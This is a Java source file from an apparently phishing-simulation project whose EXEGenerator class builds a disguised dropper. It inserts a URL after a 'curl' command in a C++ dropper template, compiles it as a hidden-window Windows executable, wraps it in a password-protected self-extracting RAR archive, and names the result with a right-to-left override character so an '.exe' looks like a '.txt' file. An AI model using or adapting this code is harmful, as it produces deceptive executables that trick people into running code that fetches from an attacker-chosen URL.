package com.galimimus.phishingmonitor.helpers;

import com.galimimus.phishingmonitor.StartApplication;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class EXEGenerator {
    static final Logger log = Logger.getLogger(StartApplication.class.getName());

    public void EXE_gen(String filename, String url) {
        System.out.println("EXE_GEN started");
        StringBuilder text = new StringBuilder();
        Pattern pattern = Pattern.compile(" = \"/C curl ");
        Scanner scanner;
        SettingsSingleton ss = SettingsSingleton.getInstance();
        try {
            scanner = new Scanner(new File(Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","dropper-original.cpp").toString()));
        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }
        String tmp;
        Matcher matcher = pattern.matcher("");
        while (scanner.hasNextLine()) {
            tmp = scanner.nextLine();
            matcher.reset(tmp);
            while (matcher.find()) {
                StringBuilder sb = new StringBuilder(tmp);
                sb.insert(matcher.end(), "\\\""+url+"\\\"");
                System.out.println(url+" "+java.net.URLDecoder.decode(url, StandardCharsets.UTF_16));
                tmp = String.valueOf(sb);
            }
            text.append(tmp).append("\n");
        }
        scanner.close();
        Path DropperGeneratedPath = Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","dropper_outs","dropper" + filename/*.split("\u202e")[0] */+ ".cpp");
        try {
            byte[] bt = String.valueOf(text).getBytes();
            Files.write(DropperGeneratedPath, bt, StandardOpenOption.CREATE);
        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }
        try {
            String commandGen = ss.getMINGW_COMMAND()+" " +
                    DropperGeneratedPath + " -o " + Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","dropi.exe")+" -mwindows -static-libstdc++ -static-libgcc";
            String commandCpOriginals = ss.getCP_COMMAND()+" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files/archive-original.exe")
                    +" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp");
            String commandUpdate = ss.getRAR_COMMAND()+" u -ep "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","archive-original.exe")
                    +" " +Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","dropi.exe")+" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","file.txt");
            String commandPass = ss.getRAR_COMMAND()+" p"+ss.getSFX_PASSWORD()+" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","archive-original.exe");
            String commandCpOuts = ss.getCP_COMMAND()+" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","archive-original.exe")+" "+
                    Paths.get(ss.getWORKING_DIRECTORY(),"files",filename+".\u202etxt.exe");


            readData(Runtime.getRuntime().exec(commandGen));
            readData(Runtime.getRuntime().exec(commandCpOriginals));
            readData(Runtime.getRuntime().exec(commandUpdate));
            readData(Runtime.getRuntime().exec(commandPass));
            readData(Runtime.getRuntime().exec(commandCpOuts));

        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }

    }

    private void readData(Process run) {
        String line;

        BufferedReader inputReader = new BufferedReader(new InputStreamReader(run.getInputStream()));
        BufferedReader outputReader = new BufferedReader(new InputStreamReader(run.getErrorStream()));
        try {
            while ((line = inputReader.readLine()) != null) {
                System.out.println(line);
            }
            inputReader.close();
            while ((line = outputReader.readLine()) != null) {
                System.out.println(line);
            }
            outputReader.close();

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
